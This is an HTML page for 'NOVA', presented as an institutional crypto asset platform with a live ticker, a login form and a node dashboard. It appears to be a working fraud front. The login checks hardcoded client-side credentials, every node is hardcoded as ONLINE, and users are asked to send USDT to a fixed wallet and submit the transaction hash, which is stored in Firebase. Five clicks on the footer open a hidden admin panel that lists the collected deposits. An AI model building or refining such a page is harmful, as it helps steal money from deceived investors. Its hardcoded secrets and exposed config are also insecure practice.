<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Institutional Asset Infrastructure</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); overflow-x: hidden; }
        
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; border-bottom: 1px solid #112240; }
        
        /* Auth Page */
        #landing-page { display: flex; min-height: 100vh; }
        .info-panel { flex: 1.2; padding: 60px; display: flex; flex-direction: column; justify-content: center; }
        .auth-panel { flex: 0.8; display: flex; justify-content: center; align-items: center; background: #020c1b; }
        .auth-card { background: var(--card-bg); padding: 40px; border-radius: 12px; width: 100%; max-width: 350px; border-top: 4px solid var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* Dashboard */
        #dashboard { display: none; padding: 40px; max-width: 1000px; margin: auto; animation: fadeIn 0.5s; }
        .node-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 20px 0; }
        .node-item { background: #112240; padding: 10px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; border: 1px solid #233554; }
        
        input, select { width: 100%; padding: 12px; background: #0A192F; border: 1px solid #233554; color: white; border-radius: 4px; margin-bottom: 15px; }
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 4px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        
        .status-on { color: var(--accent); font-weight: bold; }
        footer { text-align: center; padding: 40px; color: var(--text-dim); font-size: 12px; cursor: default; }
        
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @media (max-width: 900px) { #landing-page { flex-direction: column; } .info-panel { padding: 30px; } }
    </style>
</head>
<body>

    <div class="ticker">
        <marquee id="live-ticker">BTC/USD: $64,231.50 (+1.2%) | ETH/USD: $3,452.10 | ACTIVE NODES: 1,842 | SYSTEM: SECURE</marquee>
    </div>

    <div id="landing-page">
        <div class="info-panel">
            <h1 style="font-size: 3.5rem; color: var(--accent); margin:0;">NOVA.</h1>
            <p style="color: var(--text-dim); font-size: 1.1rem;">Next-generation institutional asset management. Secure your capital through our worldwide decentralized node protocol.</p>
            <div style="margin-top: 20px;">
                <p>🟢 Primary Infrastructure: 10 Nodes</p>
                <p>🔵 Verification Layer: 5 Nodes</p>
            </div>
        </div>
        <div class="auth-panel">
            <div class="auth-card">
                <h2 style="text-align: center; letter-spacing: 2px;">AUTHORIZE</h2>
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Access Key">
                <button class="btn-prime" onclick="handleLogin()">Login Terminal</button>
            </div>
        </div>
    </div>

    <div id="dashboard">
        <h1 style="color: var(--accent);">TERMINAL ACTIVE</h1>
        <p style="color: var(--text-dim);">Institutional Node Monitor - [ID: NV-GLOBAL-88]</p>
        
        <div class="node-grid" id="nodeContainer"></div>

        <div style="background: #112240; padding: 30px; border-radius: 12px; border: 1px solid var(--accent); margin-top: 30px;">
            <h3>Activate Personal Node</h3>
            <p style="font-size: 13px;">Transfer USDT to the address below to initiate node activation.</p>
            <div id="walletBox" onclick="copyWallet()" style="background: #020c1b; padding: 15px; border-radius: 5px; font-family: monospace; color: var(--accent); cursor: pointer; border: 1px dashed #444; margin-bottom: 20px;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>
            <input type="text" id="txid" placeholder="Transaction Hash (TXID)">
            <button class="btn-prime" onclick="submitDeposit()">Submit Activation</button>
        </div>
        
        <p onclick="logout()" style="text-align:center; color:gray; cursor:pointer; margin-top:20px;">Terminate Session</p>
    </div>

    <footer id="secret-trigger">
        &copy; 2026 NOVA CAPITAL GLOBAL INFRASTRUCTURE. ALL RIGHTS RESERVED.
    </footer>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // --- AUTH LOGIC ---
        window.handleLogin = function() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(u === "nova_global" && p === "nova786") {
                localStorage.setItem("nova_auth", "true");
                showDashboard();
            } else { alert("Access Denied, sweetie."); }
        };

        // --- DEPOSIT LOGIC ---
        window.submitDeposit = async function() {
            const tx = document.getElementById('txid').value;
            if(tx.length < 10) return alert("Enter valid TXID");
            
            try {
                await addDoc(collection(db, "deposits"), {
                    txid: tx,
                    timestamp: new Date().toISOString(),
                    status: "Pending"
                });
                alert("Verification In Progress. Your node will be active soon!");
            } catch(e) { alert("Network Error. Try again."); }
        };

        // --- SECRET ADMIN LOGIC ---
        let clicks = 0;
        document.getElementById('secret-trigger').onclick = async function() {
            clicks++;
            if(clicks === 5) {
                const pass = prompt("Enter Master Admin Key:");
                if(pass === "nova_boss_786") {
                    const querySnapshot = await getDocs(collection(db, "deposits"));
                    let dataStr = "--- LIVE DEPOSITS ---\n";
                    querySnapshot.forEach((doc) => {
                        dataStr += `TXID: ${doc.data().txid} | Time: ${doc.data().timestamp}\n`;
                    });
                    alert(dataStr);
                }
                clicks = 0;
            }
        };

        // --- UI HELPERS ---
        function showDashboard() {
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            loadNodes();
        }

        function loadNodes() {
            const container = document.getElementById('nodeContainer');
            const nodes = ["NV-Alpha (London)", "NV-Beta (Tokyo)", "NV-Gamma (NY)", "NV-Delta (SG)", "NV-Epsilon (FR)", "NV-Zeta (SYD)", "NV-Eta (DXB)", "NV-Theta (PAR)", "NV-Iota (HK)", "NV-Kappa (ZRH)", "V-Layer-1", "V-Layer-2", "V-Layer-3", "V-Layer-4", "V-Layer-5"];
            container.innerHTML = "";
            nodes.forEach(n => {
                container.innerHTML += `<div class="node-item"><span>${n}</span><span class="status-on">ONLINE</span></div>`;
            });
        }

        window.copyWallet = () => {
            navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2");
            alert("Address Copied!");
        };

        window.logout = () => { localStorage.removeItem("nova_auth"); location.reload(); };

        if(localStorage.getItem("nova_auth") === "true") showDashboard();
    </script>
</body>
</html>
